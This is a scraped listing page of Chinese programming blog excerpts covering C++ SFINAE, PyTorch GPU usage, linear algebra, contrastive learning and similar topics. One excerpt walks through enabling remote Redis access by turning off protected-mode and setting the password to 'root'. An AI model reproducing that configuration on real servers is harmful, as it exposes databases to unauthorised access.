		文章目录 一、函数重载和标签分发1.1 函数重载1.2 标签分发 二、模板特化三、 SFINAE3.1 类型相关3.2 表达式相关3.3 偏特化相关 四、 if constexpr 程序员写的代码里，最核心的内容之一就是根据不同的条件判断执行不同的逻辑分支，也就是所谓的if else，而分支判断又可以分为运行时和编译期两种，运行时的判断大家都很熟悉，比如对于后端服务，根据请求里字段的不同走不同的逻辑分支。另一类则是编译期就可以确定的分支选择，通常和特定的类型有关，比如对于一个object pool，因为需要重复利用对象，我们可以写一个通用的函数模板来执行clear，不同的类型有不同的clear操作，同时编译期计算在性能上也有很大帮助，运行时就不需要再进行额外的判断或计算了，这也是模板元编程的核心理念。 一、函数重载和标签分发 1.1 函数重载 函数重载大家都不陌生，其实这也是C++里最基本的最常用的编译期分支选择技术，可以有多个同名的函数，编译器会根据实参和形参的匹配情况来选择最合适的版本。下面引用Exceptional C++ Style关于函数重载的一个例子：
#include &lt;complex&gt; class Calc { public: double Twice(double); private: int Twice(int i); std::complex&lt;float&gt; Twice(std::complex&lt;float&gt; c); }; int main() { Calc c; c.Twice(21); //编译出错，因为int Twice(int i) 是private的 } 以上的代码的函数重载主要有以下几个步骤：
（1）名字查找：编译器会首先寻找至少包含一个名为Twice的实体作用域，并将其放入候选实体列表。本例中，编译器的名字查找首先是从Calc的作用域中开始，编译器会查看Calc中是否至少存在一个名为Twice的成员，如果没有，就会继续依次在其基类和外围空间中查找，直到找到一个至少具有一个候选函数的作用域。这里是在Calc类内部找到三个名为Twice的候选函数。
（2）重载决议。编译器在候选的重载函数中选出唯一的最佳匹配。因为c.Twice(21)参数是21，所以最佳匹配是Twice(int)。这种是精准匹配的情况，如果没有这种精准匹配，会尝试隐式转换后可以匹配的函数，如果仍然没有，编译报错。
（3）可访问性检查。最后编译器会检查函数的可访问性，因为Twice(int)是private，不可访问从而导致编译失败，是的，会直接失败而不是退而求其次选double的版本。
通过函数重载，本质上也就是在编译期选择了不同的代码分支。
1.2 标签分发 而标签分发（tag dispatch），则是对函数重载机制的利用，和我们平常习惯的函数重载不一样的点在于，会用一个参数仅仅作为一个标签，这个标签并不参与任何代码逻辑，仅仅用于指导编译器选择合适的重载版本，这也是标签分发名称的由来，标签分发通常是为了解决参数相同但需要走不同的函数的问题，
标签参数通常都是一个空类，此项技术在stl库里面也有大量使用（c++20之后可以用concept更方便地实现）。这里来看一个迭代器的例子，我们知道stl里不同容器的迭代器的类型是不一样的，对于list这种，因为底层是双链表，不能随机访问，只能每次向前向后挪一，属于bidirectional_iterator，而vector这种，因为底层是连续内存空间，因此可以直接进行指针运算跳到需要的位置，属于random_access_iterator。
我们再来看std::advance函数的实现，如果需要前进n，对于random_access_iterator，我们是可以直接+n的，而对于普通的forward_iterator_tag，只能n次单加，因此可以利用标签分发写出类似以下的实现：
这里属于函数模板里使用标签分发，但是本质上和普通函数的重载是一样的。第三个参数就是标签，仅仅用于选择不同的函数，这个标签可以通过std::iterator_traits从迭代器中萃取出来。有了不同tag的impl函数，我们可以使用一个统一的入口函数来调impl，从而让编译器根据标签选择合适的版本。
下面是cppreference上的一个基于迭代器做自定义算法的标签分发的例子：
二、模板特化 模板特化指的是除了主模板之外，针对特定的模板参数额外提供特定的实现，分为全特化合偏特化两种：
（1）全特化：指定所有的模板参数
（2）偏特化：指定部分模板参数
函数模板在选择过程也有重载决议，和函数重载类似，编译器也会从候选集中选取最合适的版本进行实例化，对于特化情况，编译器会优先选择特化程度最高的，从而让程序员能够在部分或者全部参数为特定类型的情况下提供不同的实现。
三、 SFINAE SFINAE（Substitution Failure Is Not An Error），即替换失败不是错误，这是一条针对函数模板重载决议的规则，详细的定义是：当模板形参在替换成显式指定的类型或推导出的类型失败时，只是从重载集中丢弃这个特化，而不会直接导致编译失败。通俗地来说就是，在编译器check模板调用的过程中，尝试使用某些版本会导致failure并不会导致编译失败，只要有能够正常用的，其余的failure会被忽略，这也是模板元编程经常用到的一个重要特性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc9a539903e0a9a6baa35c32bfe51caf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51fa879eb4f6a7e7560e9a853b4063f0/" rel="bookmark">
			变量4 大国的腾挪 何帆
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 如果有个问题你实在解决不了，那可能你问的问题是错的。
2.疫情之下中国低收入家庭的收入及财富恢复情况落后于全社会，而高收入家庭的财富和收入持续增长，二者的差距在加大。
3.如果人生是一个函数，那么现在你的某个变量取值范围有点小了
4.时间像是被剁碎的肉馅，我们可能只是洋葱
**5.没戏了先生与“小镇做题家”
VUCA世界
不稳定volatility
不确定uncertainty
复杂complexity
模糊 ambiguity
7.所谓挪腾，就是用空间换时间
8.秾丽 ：花木繁盛
9.寻找破局点，这一招之所以有效，是因为竞争是多维度的
10.存人失地，人地皆存，存地失人，人地皆失
11.当你想要增加自己的新兴力量时，你需要的是拨火棍，小心的呵护火种，不断添柴，还需要用一根棍子拨弄，让火烧的更旺
12.改变自己的约束条件，也就是去掉过去的包袱
13.穆罕默德对商人非常敬重：商人犹如世界上的信使，是真主在大地上的可信赖的奴仆。
14.未来的乡村会变成更加开放的社区。
象牙塔”一词后来被逐渐运用到社会生活的各方面，在汉语中，象牙塔本指忽视现实社会丑恶悲惨之生活，而自隐于其理想中美满之境地以从事创作的人，意为超脱现实社会，远离生活之外，躲进孤独舒适的个人小天地，凭借头脑从事写作活动的人；如今含义为“比喻脱离繁杂多变现实生活的知识分子（文学家和艺术家、科学家）的小天地，专心从事学术事业的人”，其被誉为“与世隔绝的‘梦幻境地’、逃避现实生活的‘世外桃源’、‘隐居之地’"
16.未来，县城可能成为文艺创作的中心，美好生活的样板
17.如果想要讨好所有人，最后的结果一定是把所有人都得罪了
18.把自己放空才能学到更多东西
19.边缘从中心收到熏陶，中心从边缘汲取营养
20.边缘的创新要得到中心的认可 边缘学会绽放，是因为中心学会了谦让
21.未来的中国，最稀缺的才能就是理解真实中国，基层中国，边缘中国
22.达摩克利斯之剑
23.小镇能消磨意志也能激发创意
24.未来基础设施老化和人口老龄化走到一起可能带来更多问题，但也带来更多商机
25.未来的大数据互联网将成为一个国家最基础的服务产业，会像发电厂，电力局一样成为国有事业单位。
26.大数据的雨来临，云时代已过，渠时代来临 BT人才将比IT人才更为稀缺
27.美好生活的标志不是物质富裕，也不是精神充实，而是对老人的关怀，逝者的追思
28.
29.智能驾驶这么难可能是因为我们约束条件太多了，比如用于高速公路或是建设一条适用于智能驾驶的道路。 在我看来，智能驾驶应用于与其配套的智能道路，智能红绿灯，智能机器人，智能环境，抽离这些条件直接用于当前的适合人类的道路很难行的通；此外可以参考百度提出的云代驾，借助5G让人远程控制车辆在道路行驶，技术成熟之后再过渡到AI远程控制，可能未来AI也要被选择，每个AI都有名字和性格，将筛选优质AI作为司机，但同时也要避免邪恶AI与人类结盟。**
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f96216d1915e463b7ab14b488d2386d/" rel="bookmark">
			LeetCode第278场周赛题解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📒博客首页：崇尚学技术的科班人
小肖来了🏇
🍣今天给大家带来的文章是《LeetCode第278场周赛》🍣
🍣希望各位小伙伴们能够耐心的读完这篇文章🍣
🙏博主也在学习阶段，如若发现问题，请告知，非常感谢🙏
💗同时也非常感谢各位小伙伴们的支持💗
文章目录 &lt;1&gt; 第一题题目示例提示⭐思路⭐代码实现运行结果 &lt;2&gt; 第二题题目示例提示⭐思路⭐代码实现运行结果 &lt;3&gt; 第三题题目示例提示⭐思路⭐代码实现运行结果 &lt;1&gt; 第一题 题目 将找到的值乘以 2
给你一个整数数组 nums ，另给你一个整数 original ，这是需要在 nums 中搜索的第一&gt;个数字。
接下来，你需要按下述步骤操作：
如果在 nums 中找到 original ，将 original 乘以 2 ，得到新 original（即，令 original = 2 &gt;* original）。否则，停止这一过程。只要能在数组中找到新 original ，就对新 original 继续 重复 这一过程。 返回 original的 最终 值。
示例 示例1： 输入：nums = [5,3,6,1,12], original = 3 输出：24 解释： - 3 能在 nums 中找到。3 * 2 = 6 。 - 6 能在 nums 中找到。6 * 2 = 12 。 - 12 能在 nums 中找到。12 * 2 = 24 。 - 24 不能在 nums 中找到。因此，返回 24 。 示例2： 输入：nums = [2,7,9], original = 4 输出：4 解释： - 4 不能在 nums 中找到。因此，返回 4 。 提示 1 &lt;= nums.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f96216d1915e463b7ab14b488d2386d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5e42a91d18b7f7a5c10f2aa592a00df/" rel="bookmark">
			【python】可视化-柱状图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文绘制以上6种类型的柱状图
导入需要的包
#导入需要的包 import pandas as pd import numpy as np import matplotlib.pyplot as plt import seaborn as sns 读取数据
df = sns.load_dataset("tips") 基础图 df_bar = df.groupby(by='size').agg({'tip':sum}).reset_index() plt.bar(x='size',height = 'tip',data=df_bar) # x-横坐标，分类变量（可以是数值型，也可以是字符型） # height-纵坐标，数值型变量 plt.bar(x='size',height = 'tip',data=df_bar) sns.despine() #去除图脊,默认去掉上边和右边 plt.bar(x='size',height = 'tip',data=df_bar) sns.despine(left = True,bottom = True) #去除所有图脊 plt.yticks([])#不显示纵坐标 #遍历横纵坐标，将文本添加到具体的位置上 for x,y in zip(df_bar['size'],df_bar['tip']): text = str(y) xy=(x,y+5) plt.annotate(text,xy=xy,fontsize=10,color="black",ha="center",va="baseline") 堆积柱状图 #数据准备 df_bar_1 = df.loc[df['sex'] == 'Male'].groupby(by='size').agg({'tip':sum}).reset_index() df_bar_2 = df.loc[df['sex'] == 'Female'].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5e42a91d18b7f7a5c10f2aa592a00df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a23a8af739f28e3a38625712c94c8770/" rel="bookmark">
			有关Pytorch训练时Volatile Gpu-Util(GPU利用率)很低，而Memory-ueage(内存占比)很高的情况解释与说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有关Pytorch训练时GPU利用率很低，而内存占比很高的情况 前言有关GPU的Memory-usage的占用（GPU内存占有率）有关Volatile GPU-Utile的利用率（GPU的利用率） 直接参考
前言 模型开始训练时候，常用watch -n 0.1 nvidia-smi来观察GPU的显存占比情况，如下图所示，通常GPU显存占比和GPU利用率都很高，但有的模型训练的时候GPU利用率（Volatile GPU-util）占比在不断的动态变化，从0-100%之间不断浮动循环。
如果发生上述这种GPU利用率不断变化情况，可以进一步通过命令行中输入Top指令来查询一下CPU的利用率，可以从中发现问题所在。
有关GPU的Memory-usage的占用（GPU内存占有率） GPU中Memory-usage最直接的影响因素是模型的大小和Batch size的大小。其中模型对GPU中Memory-usage因素包括网络的参数量（网络的深度，宽度等），而一般在训练时候模型结构都已经固定，很少再轻易的改动。因此，我们对Memory-usage的占用的影响主要调控在Batch size的大小，如batch size设置为12，Memory-usage为40%；与设置为24相比，Memory-usage内存占用率是80%，接近于2倍关系，偏差不大。所以在模型结构固定的情况下，尽量将batch size设置大，充分利用GPU的内存。（GPU会很快的算完你给进去的数据，而有关训练时间主要瓶颈在CPU的数据吞吐量上面。）
有关Volatile GPU-Utile的利用率（GPU的利用率） 这个是Volatile GPU-Util表示，当没有设置好CPU的线程数时，这个参数是在反复的跳动的，0%，20%，70%，95%，0%。这样停息1-2 秒然后又重复起来。其实是GPU在等待数据从CPU传输过来，当从总线传输到GPU之后，GPU逐渐起计算来，利用率会突然升高，但是GPU的算力很强大，0.5秒就基本能处理完数据，所以利用率接下来又会降下去，等待下一个batch的传入。因此，这个GPU利用率瓶颈在内存带宽和内存介质上以及CPU的性能上面。最好当然就是换更好的四代或者更强大的内存条，配合更好的CPU。
另外的一个方法是，在PyTorch这个框架里面，数据加载Dataloader上做更改和优化，包括num_workers（线程数），pin_memory=True，会提升速度。解决好数据传输的带宽瓶颈和GPU的运算效率低的问题。在TensorFlow下面，也有这个加载数据的设置
为了提高利用率，首先要将num_workers（线程数）设置得体，4,8,16是几个常选的几个参数。本人测试过，将num_workers设置的非常大，例如，24，32,等，其效率反而降低，因为模型需要将数据平均分配到几个子线程去进行预处理，分发等数据操作，设高了反而影响效率。当然，线程数设置为1，是单个CPU来进行数据的预处理和传输给GPU，效率也会低。其次，当你的服务器或者电脑的内存较大，性能较好的时候，建议打开pin_memory打开，就省掉了将数据从CPU传入到缓存RAM里面，再给传输到GPU上；为True时是直接映射到GPU的相关内存块上，省掉了一点数据传输时间。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74218039a76029cb6d0dd952b6754111/" rel="bookmark">
			python如何安装numpy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 根据python版本下载相应版本的numpy保存至D:\Program Files (x86)\Python\Python37\Scripts\ numpy下载地址
2. win+R，输入cmd，打开命令行窗口，定位到python的安装目录 3. 输入python -m pip install numpy或定位到目录：D:\Program Files (x86)\Python\Python37\Scripts，输入pip3.7 install numpy-1.19.1-cp37-cp37m-win_amd64.whl 4. pycharm安装numpy参考：pycharm 安装numpy包——超简单 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/527eea1ea0084b9f5d15d2bef08656bf/" rel="bookmark">
			线性代数基础8--正交与投影,最小二乘法的线性解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面进入线性代数的第二部分,主要是研究空间的正交性
1,
之前提到过四个基本子空间的维数,现在继续深入
行空间与0空间相互正交(交集只有0向量),列空间与左零空间也相互正交.
2,
两个向量正交,就等价于上面的公式.也可以说,做一个x与y的点乘.
以下是证明
这里x的转置×y与y的转置×x是相同的,因为点乘是一个数,所以一个数的转置任然是这个数.所以从向量的勾股定理得出这个结论.
并且0向量与任意向量都正交.
这是x向量与y向量正交的两种现象,一种是模,一种是点乘为0.
3,将正交的概念推广到空间.
如果说空间S与空间T相互正交,就是说S中的任意一个向量都与T中向量正交.
所以说黑板平面与地板平面两个平面是否为正交的?
结果是不是,因为有一些向量同时在两个平面上.它肯定不垂直于自己
所以说,如果一个向量(除了0向量)同时存在于两个平面,那这两个平面一定不正交.
4,行空间与0空间相互正交
证明过程如下
需要证明X与任意行的线性组合都正交.
零空间与行空间是N维空间的正交补,因为他们维数加起来等于N,且相互正交,互为正交补空间说明什么?
说明0空间中包含所有正交于行空间的向量.而不是部分.
5,第二部分的重要问题是:
如果AX=B没有解,如何去解这个方程组.听上去有一些矛盾.
如果有M个方程,N个未知数,并且M&gt;N,那么求解AX=B很容易出现无解的情况.因为必然有0行.
当M&gt;N,并且B中有坏的数据时候,AX=B就解不出来.所以我们要做的就是把其中的坏数据挑选出来.
最简单的方法就是,将坏数据的方程去掉,得到一个可逆的矩阵.
第二种方法:同乘以A的转置.
这个新的方程组与原方程组解不同,但是我们希望求出新的方程组的解.并且是最优解.
6,第二部分一个重要矩阵
这个矩阵结果一定为方阵,N×N并且满足转置之后不变,也就是对称方阵.但结果不一定可逆.
但是有两条重要性质
那么A的转置×A何时可逆,就是当A可逆的时候,0空间只有0向量的时候.
两个秩为1的矩阵相乘结果的秩不大于1.
7,投影
其实就是a与e垂直,e可以表达为b-xa,并且a的转置表示一行,并且x为一个数字.
化简如下:
这个式子表示如果b变为2倍,p(投影)也变成二倍.a变为2倍,p不变.
如果我们建立一个投影矩阵的概念.如上就可得到p=Pb,P矩阵如上.它的分母是一行乘以一列所以是一个数字,分子是一个n维矩阵.
这个P投影矩阵有几个重要性质.
由于b向量经过投影矩阵得到p,p=xa所以p向量的维数与a空间的维数相同.
P为对称矩阵
P的平方等于P,因为投影两次,第二次的结果不变.
8,为什么要做投影
当B不在A的列空间中时,AX=B就会无解.一个解决方法可以是:将B向量投影到A的列空间中得到P,这样就可以保证AX=P有解.注意这两个X并不相同,而是最接近的解.
对于多维的情况:
如图,e可以看作是b与p的误差.只有在A平面上的b才有解.通过投影得到p,注意a1,a2的线性组合x变成了最近似结果(因为垂直误差最小),所以x要加一个上标.
有如上推理过程,与一维的情况类似.误差e就在A的左零空间中,这也可以联系左零空间与列空间相互垂直.e就是左零空间中的一个向量,垂直于列空间.
由此我们推出了n维投影的近似解x_,投影与投影矩阵的公式,这里可以看出与一维形式相吻合,不过一维形式a的转置乘a为一个数,所以逆变成了倒数
那么矩阵乘法符合结合律,那么是否可以得到上图的公式?
答案是不可以,这里的关键问题是A不一定可逆,当A可逆的时候,表示的是整个Rn空间,所以投影矩阵才是单位矩阵.因为对于长方矩阵2×3,A的秩为2,那么A不可逆但是另一个却是可逆的.
这里有个重要的问题是A的转置乘以A是否一定可逆?
如果矩阵A的列向量线性无关，那么A转置乘以A可逆,这里A的列向量选取的是基,A列满秩,所以一定是可逆的.
如果A是方阵,那么就表示的是整个空间Rn了.
最后P同样有这两条性质
9,线性代数在回归中的应用
在回归问题中,我们需要找到一条直线,使得几个样本点,都尽可能靠近这条直线,也就是误差最小.
误差就是投影中的误差e,通过垂直来使得每个点的误差最小.
这里定义了解出最优直线的第一种方法,就是多元函数求偏导求解
这里就是一直提到的正规方程的来历,它使用的就是A的列空间与误差垂直时,误差最小.也就是前面A转置(b-p)=0的方程.那么我们需要知道几个关键量.b为[1,2,2]就是原来样本点的结果,我们需要将这个向量投影到A的线性空间内.那么A是什么?我们把样本的X都带入得到一组方程,我们想让这组方程的结果与b接近.C和D就是x_,我们要求一个线性组合,就是这个方程组.所以A是这样得到的.p表示确定了线性组合以后投影在直线上的哪个点.e很明显.
这里A的列空间其实是一个平面,需要在这个平面上,找到与b垂直的那条线,就是误差最小的.
以上两个方法最后得到的结果都是上面这两个方程
这里的p和e两个是相互垂直的所以点积为0.并且这里e还垂直于列空间的任意向量,这里简单的取[1,1,1].[1,2,3]验证
10,
这里可以将b看作两个垂直方向的分量.如下图
b在列空间上的投影是pb,是没有问题的.那么b在左零空间上的投影是什么呢?
e=(I-P)b,展开就可以得到结果.在上面一直提到的是e=b-AX_,这里AX_就等于pb
如果b垂直于列空间,说明他是左零空间的一个向量,就有A的转置×b=0,所以从上面公式可以看出p=0.
我们如何表示A的列向量呢?很简单b=AX就表示A的列空间.所以AX表示一个列空间中的向量,把它带入到p中就可以看出p=AX=b
11,
证明如果A线性无关,那么A的转置乘A可逆.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/527eea1ea0084b9f5d15d2bef08656bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8093c05293fb7f31ae5ddc30ffbc4350/" rel="bookmark">
			智能运维（AIOps）系列之五：误区总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 智能运维是一套复杂的人工智能解决方案，也是一个庞大的系统工程。除了涉及到 业务、产品、技术 之外，还涉及到 管理/组织架构 和 产品运营。
接下来介绍的几点，都是实际工作中遇到的问题
人工智能的误区 人工智能教训总结：https://blog.csdn.net/micklongen/article/details/121030011
现阶段，很多人对人工智能都抱有理想化的情况，比如说能 自动学习 等等。
自动化学习都包含哪些技术 迁移学习 两个维度，四种情况 数据域：源域，目标域任务类型：源任务，目标任务 元学习 模型的参数自调整 针对初始化参数针对学习率针对网络结构等等 预训练模型 经典例子：BERT 总结 现阶段，比较成功的应该是预训练模型；其他的几种类型，限制条件都比较大； 行业发展现状 推荐系统 基于专家系统/知识工程的算法：推荐系统数据冷启动问题；基于物品内容的算法：推荐系统物品等启动问题；协同过滤算法（用户/物品）：挖掘用户新的兴趣点； 智能问答 通用的智能问答系统，目前还处于研究阶段；一般情况下，智能问答相关的技术，用在推荐引擎，可能效果会更好一些； 为什么要重点提出这些 人工智能从一开始，目标就是为了开发出一个通用的系统，但是几十年发展下来，越来越倾向于解决垂直领域的问题，甚至是垂直领域中的一个问题，目的就是为了落地。
智能运维从2016年开始提出，一开始也是期望一个算法或者几个算法就是无监督的解决特定的问题（比如说KPI），到最新的发展阶段，已经抛弃的这些思路，开始倾向于深入业务去解决问题。
推荐系统，智能问答也是。
智能运维在开始阶段，不要把资源浪费在寻找通用的算法或者解决方案，而是应该深入业务，解决业务中的一个痛点或者几个痛点，以点带面。
我个人认为，智能运维落地并不难，就像推荐系统，最简单的思路就是热点推荐，是个开发人员都能做。
智能运维需要尽快通过落地，积累数据，深入了解业务，以及跟用户产生互动，才有机会往更加深远的领域发展。
管理/组织架构 Leader：leader 是整个项目落地的关键。因此 leader 最好是一个懂技术的人。如果 leader
是业务出身，不懂技术，那么带来的最大问题就是： a. 很容易想当然，觉得实现一个功能没什么大不了的；b. 就算把功能实现了，也没有能力体系化，产品化，只是孤立的把一个功能看成是一个功能；c. 大部分业务，还是很排斥学习技术； 偏工程领域的工程师；算法工程师最好要有产品经理：智能运维还是蛮新颖的东西，不像监控已经很成熟了。如何让用户有好的产品体验，决定了项目成熟周期的长短、甚至是成败。 产品运营 收集初期目标用户的需求；Demo开发，确认；Demo产品化；验证产品的有效性：可以通过混沌工程建立用户的反馈机制 产品文档，测试用例产品使用答疑群：可以把目标用户、潜在的目标用户拉到群里平时跟用户多沟通，了解用户的使用体验； 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2257757a762cf6ee579f29d2d5f681f3/" rel="bookmark">
			C语言结构体变量——struct
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们有大量且类型不同的数据需要描述的时候，如果针对每个数据都去定义一个变量或数组，是很消耗时间和内存的，那么如何跟方便的存储大量不同类型的数据呢，这就需要用到结构体变量了
结构体变量——struct是一种构造类型
构造类型：不是基本类型的数据结构也不是指针，它是由若干个相同或不同类型的数据构成的集合。
结构体概念：结构体是一种构造类型的数据结构，是一种或多种基本类型或构造类型的数据的集合
1.结构体类型的定义 结构体类型的定义方法：在使用结构体之前必须先有类型，然后用类型定义数据结构，这个类型相当于一个模具
定义结构体类型的方式如下：
struct 结构体类型名
{
成员列表
};
2.定义结构体变量 如果我们要定义结构体变量，可以在分号前面定义，下面举个详细的例子
假如我们要记录三名学生的年龄，姓名和性别，我们可以这样定义结构体类型和结构体变量
有了结构体类型之后，就可以用类型定义变量了
一般结构体类型都会定义在全局，也就是main函数的外面，所以在定义结构体类型的同时定义变量，这些变量一般都是全局变量，定义完类型之后定义的结构体变量内存分配要看定义的位置
struct stu ; { //定义了三个struct stu类型的变量 //每个变量都有三个成员，分别是num，name，sex int num; char name[20]; char sex; } lucy,bob,lilie; //结构体变量，分别是lucy，bob，lilie 在定义结构体类型的时候顺便定义结构体变量，以后还可以定义结构体变量struct结构体类型名
struct结构体类型名
{
成员列表;
}结构体变量1,变量2;
struct结构体类型名 变量3,变量4;
注意：一般结构体类型都会定义在全局，也就是main函数的外部，所以在定义结构体类型的同时定义变量，这些变量一般都是全局变量，
定义完类型之后定义的结构体变量内存分配要看定义的位置
3.无名结构体类型的定义和typedef定义 在定义结构体类型的时候，没有结构体类型名，我们可以顺便定义结构体变量，但是
因为没有类型名，所以之后就不能再定义相关类型的数据了
struct
{
成员列表;
}变量1,变量2;
使用typedef给结构体变量取别名
通常将一个结构体类型重新起个类型名，用新的类型名替代原先的类型
typedef struct 结构体名 //这里的结构体名是可以省略的
{
成员列表;
}重新定义的结构体类型名;
注意：typedef主要用于给一个类型取别名，此时相当于给当前结构体重新起来一个类型名，相当于struct结构体名
4.结构体变量的初始化及使用 结构体变量的定义初始化及使用
1.结构体变量的定义和初始化
2.在定义结构体变量之前首先得有结构体类型，然后在定义变量
3.在定义结构体变量的时候，可以顺便给结构体变量赋初值，被称为结构体的初始化
4.结构体变量初始化的时候，各个成员按顺序初始化
struct stu { int id; char name[20]; char sex; char age; }zhangsan,lisi = {1002,“李四”,’B’,25}; int main() { struct stu wangwu; //结构体变量的初始化 struct stu zhaoliu = {1001,“赵六”,‘B’，20}; return 0; } 使用typedef对结构体成员取别名并初始化
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2257757a762cf6ee579f29d2d5f681f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ddba052c9c5e7b16b45937072d4b7a2/" rel="bookmark">
			Unsupervised Learning | 对比学习——13篇论文综述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 第一阶段：百花齐放1.1 InstDisc1.2 InvaSpread1.3 CPC1.4 CMC 2. 第二阶段：CV双雄2.1 MoCov12.2 SimCLRv12.3 MoCov22.4 SimCLRv22.5 SWaV2.6 Other 3. 第三阶段：不用负样本3.1 BYOL3.2 SimSiam 4. 第四阶段：Transformer4.1 MoCov34.2 DINO 5. 总结 1. 第一阶段：百花齐放 在第一阶段上，方法模型都没有统一，目标函数，代理任务也没有统一，所以说是一个百花齐放的年代。
1.1 InstDisc paper：Unsupervised Feature Learning via Non-Parametric Instance Discrimination
InstDisc的工作是受到了有监督学习结果的启发，如果把豹子的图片喂给一个已经用有监督学习方式训练好的分类器，会发现它给出来的分类结果排名前几的全部都是跟豹子相关的（比如猎豹和雪豹），而排名靠后的判断往往是和豹子一点关系也没有的类别。
InstDisc认为，让这些图片聚集在一起的原因，并不是这些图片有相似的语义标签信息，而是因为这些图片长得比较像。猎豹雪豹就是长得相似，和其他就是不相似，所以才会导致这里的分类分数。因此，作者将这种有监督的任务发挥到极致，提出了个体判别任务，作者将每一张图片都看作是一个类别，希望模型可以学习图片的表征，从而把各种图片都区分出来。
简单概括InstDisc的思想，通过一个卷积神经网络来将图片进行编码成一个低维特征，然后使得这些特征在特征空间上都尽可能的区分开，因为个体判别认为每张图片都是自成一类，结构图如下所示：
训练这个神经网络的方法是对比学习，所以需要有正样本，需要有负样本。正样本就是图像本身，可能经过数据增强，负样本就是数据集中其余的所有图片，该文章使用一个memroy bank存储这些负样本，imagenet中有128w的数据，意味着memory bank有128w行，因为负样本太多了，如果使用较高的维度表示图片的话，对于负样本的存储代价过高，因此作者让向量维度为128维。
简单的走一下这个前向传播的过程，假设模型的batchsize是256，有256张图片进入CNN网络，将256张图片编码为128维的向量。因为batchsize是256，因此有256个正样本。负样本来自memory bank，每次从memory bank中随机采样出4096个负数样本，利用infoNCE loss去更新CNN的参数。本次更新结束后，会将CNN编码得到的向量替换掉memory bank中原有的存储。就这样循环往复的更新CNN和memory bank，最后让模型收敛，就训练好一个CNN encoder了。
在InstDisc还有其他的细节，比如Proximal Regularizatio，给模型的训练增加了一个约束，从而可以让memory bank里面的特征进行动量式更新，保持一致性。
InstDisc中还有超参数的设定：
τ = 0.07 ；
passive numbers = 4096；
epoch = 200 ；
batch size = 256；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ddba052c9c5e7b16b45937072d4b7a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebdde28dc95974cfac9ab04eeb82779e/" rel="bookmark">
			redis配置远程连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis开启远程连接需要配置redis.conf文件
1.找到bind 127.0.0.1把这段注释掉，或着改成bind 0.0.0.0,但是这两种方式我试了对我都不好使。
我用的方式是改成bind 虚拟机的ip 2. protected-mode yes 改成 protected-mode no
3.requirepass foobroad打开 设置你自己的密码 我把密码设为root 就可以这样写 requirepass root
这时候远程就可以连接上了
但是我的linux本地
./redis-cli
会报错 Could not connect to Redis at 127.0.0.1:6379: Connection refused
可能是因为我把bind 127.0.0.1 改成了 bind 虚拟机的ip 的原因。：
这时候就应该./redis-cli -h 192.168.115.131 -p 6379
就可以连接上
因为我们之前配了密码所以还得输入密码 auth '你设置得密码'
这样本地也可以操作rides了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfacddab13d51c32e0f1d81cba62d8c7/" rel="bookmark">
			5G学习笔记之UE接入消息详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一点一点，就是进步~~ N3IWF：Non 3GPP InterWorking Function NRPPa：NR Positioning Protocol Annex NSCI：New Security Context Indicator NSSAI：Network Slice Selection Assistance Information S-NSSAI：Single Network Slice Selection Assistance Information 目录 1. UE接入流程图 2. RRCSetupRequest （UE —&gt; gNB-DU） 3. INITIAL UL RRC MESSAGE TRANSFER （gNB-DU —&gt; gNB-CU-CP） 4. DL RRC MESSAGE TRANSFER（ gNB-CU-CP —&gt; gNB-DU） 5. RRCSetup（gNB-DU —&gt; UE） 6. RRC CONNECTION SETUP COMPLETE （UE —&gt; gNB-DU） 7. UL RRC MESSAGE TRANSFER（gNB-DU —&gt; gNB-CU-CP） 8. INITIAL UE MESSAGE （gNB-CU-CP —&gt; AMF） 9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfacddab13d51c32e0f1d81cba62d8c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f5d0a85b4819d02ee00f08779748db4/" rel="bookmark">
			Unix/Linux操作系统分析实验一 进程控制与进程互斥
			</a>
		</h2>
		
